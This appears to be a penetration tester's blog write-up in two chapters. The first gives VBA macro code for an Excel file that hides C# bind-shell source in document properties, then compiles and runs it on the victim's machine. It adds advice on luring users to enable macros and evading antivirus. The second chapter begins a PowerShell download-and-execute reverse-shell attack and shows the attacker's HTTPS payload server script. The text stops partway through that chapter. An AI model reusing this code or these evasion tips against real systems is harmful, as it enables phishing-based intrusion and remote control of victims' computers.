# InfoSec Chronicles from Noobland
## Chapter 0: Abuse Excel VBA macro, a simple approach
###### 21/07/20 ver 1.2
In this article I will illustrate how to execute a payload loaded from a VBA macro script embedded in an Excel xlsm file.<br>
I did not implement any obfuscation\encrypting technique, this has to be consider as a POC. Beware that using well known tools will rise AV warning in most cases,
The requirement was to bypass a note AV software installed on a client machine. Following the events:
* A mail with the Excel file was sent to the client, here I play the role of the victim<br>
![Screenshot](screen/mail.png)
* The mail was not marked as Spam, the user eventually can open directly the enclosed file using the corresponding Outlook feature or download to a local folder
* Once the file has been opened of course a warning appears about the macro content. Here it is necessary to lure the user to enable the macro<br>
![Screenshot](screen/macro.png)
* If the macro is enabled the VBA script will *compile a payload*, in this case a bind shell and execute it. Here the MS firewall warn the user since I used a not common port (4444), using a port like 80 did not rise any warning<br>
![Screenshot](screen/fwarn.png)
* The bind shell is executed (a shell window will popup, you need of course to hide it), the AV will sandbox the exe file but actually the shell is executed<br/>
![Screenshot](screen/run.png)
###### *The logic*
* I embedded the source code of the bind shell in the comment property of the Excel file Here the link to the MS doc: https://docs.microsoft.com/en-us/dotnet/api/microsoft.office.tools.excel.workbook.builtindocumentproperties?view=vsto-2017 and I retrived the value in the VBA script as follows:<br>
`var = ActiveWorkbook.BuiltinDocumentProperties(5)`<br>
I used a file system object to write the source code of the shell to the *user temp folder*
```
    Dim path As String
    path = Environ("Temp")
    Dim FSO As Object
    Set FSO = CreateObject("Scripting.FileSystemObject")
    Dim oFile As Object
    Set oFile = FSO.CreateTextFile(path & "\mal.cs")
```
* Then I write the content to the file
```   
   oFile.Write var
   oFile.Close
```
* I used the same technique to get the port, that is parametric, and to initialize the wscript shell object<br>
![Screenshot](screen/propxlsm.png)
```
    Dim wSo as Object
    shellObj = ActiveWorkbook.BuiltinDocumentProperties(4)
    wSo = CreateObject(shellObj)
```
* Now we need to find a compiler on the system, I searched for the *csc.exe* since the .Net FW is installed almost on every newer Win OS and my payload is written in C#. Follows the recursive function used to accomplish the task
```
Sub FindCSC(ByVal folderPath As String)

Dim fileName As String
Dim fullFilePath As String
Dim numFolders As Long
Dim folders() As String
Dim i As Long

If Right(folderPath, 1) <> "\" Then folderPath = folderPath & "\"
fileName = Dir(folderPath & "*.*", vbDirectory)

While Len(fileName) <> 0

    If Left(fileName, 1) <> "." Then
 
        fullFilePath = folderPath & fileName
 
        If (GetAttr(fullFilePath) And vbDirectory) = vbDirectory Then
            ReDim Preserve folders(0 To numFolders) As String
            folders(numFolders) = fullFilePath
            numFolders = numFolders + 1
        Else
            If fileName = "csc.exe" Then
                CSC = folderPath & fileName 'found compiler
                Exit Sub
            End If
        End If
 
    End If
 
    fileName = Dir()

Wend

For i = 0 To numFolders - 1
    'if found we exit
    If CSC <> "" Then
        Exit For
    End If
    FindCSC folders(i)
 
Next i

End Sub
```
* Now assuming that the full path of csc.exe is stored in the CSC variable the following will compile the source file:
```
    Dim exePath As String
    exePath = """" & path & "\mal.exe" & """"
    wSo.exec CSC & " /t:exe /out:" & exePath & " " & csPath
```
* Finally I executed the bind shell
```
wSo.exec path & "\mal.exe"
```
* Once the source file has been compiled it will be deleted, if not runnin even the exe file will be deleted on closing the Excel file

###### *Conclusion*
The idea is to compile a payload on the victim machine in order to avoid to downlad it from somewhere since the corresponding code will rise alerts on AV software, same thing happens trying to run a cmd or a bat file. Not talk about powershell. Of course you have to avoid to embedd well-known code or created with msfvenom since they will be detected once compiled. Be creative and code your stuff.<br>Here you can download the Excel file and the source code of the bind shell, the file is encrypted and you need a password to open it, if you are good guy ;) you can drop me an email at **filobers[at]pm[dot]me** and I will happy to assist you<br>

## Chapter 1: Abuse IE to download and execute a payload through PS
###### 13/09/20 ver 1.0
I had to bypass a white list applications execution enviroment, lucky PS scripts were allowed on almost every machine, as well as .Net FW 3.5 executable (not signed).
The client has installed an AV solution, with an host firewall. No IPS\IDS were present on the network (now they are!).<br>
Here I will skip the social engineering part about how to lure the victim to lunch the PS script, actually this is the real magic part :). This is only a POC. Following the recipe:
1. An SSL certificate (here I will use a fake one, providing the code to bypass the error)
1. A windows client (AKA victim) machine: in this POC a win 10 pro x64 box, with a AV solution and host firewall activated
1. An attacker Linux box with Python an *old netcat version installed, here I use Parrot OS.

Since this is only a POC, as usual, not covering techniques are implemented, to cut the long story short I skip all the red teaming stuff. The execution plane was:<br>
1. The victim executes the PS script that download (though HTTPS) the encoded payload (a basic .Net Fw 3.5 reverse shell)
1. The payload is converted back to the original executable file and it is saved on the desktop user profile (yes, that is, no AV detection)
1. The exe file is hidden and executed
1. I got a shell on the attacker machine

So first of all set a HTTPS web server on the attacker machine, of course we can use a Python script:<br>
<code>
#!/usr/bin/python2
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://192.168.1.11:4443

import BaseHTTPServer, SimpleHTTPServer
import ssl
import sys

if len(sys.argv) > 1:
    httpd = BaseHTTPServer.HTTPServer((sys.argv[1], 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
    httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
    httpd.serve_forever()    
else:
    print "You must pass the local IP address to bind: " + sys.argv[0] + " 192.168.1.11"

</code>

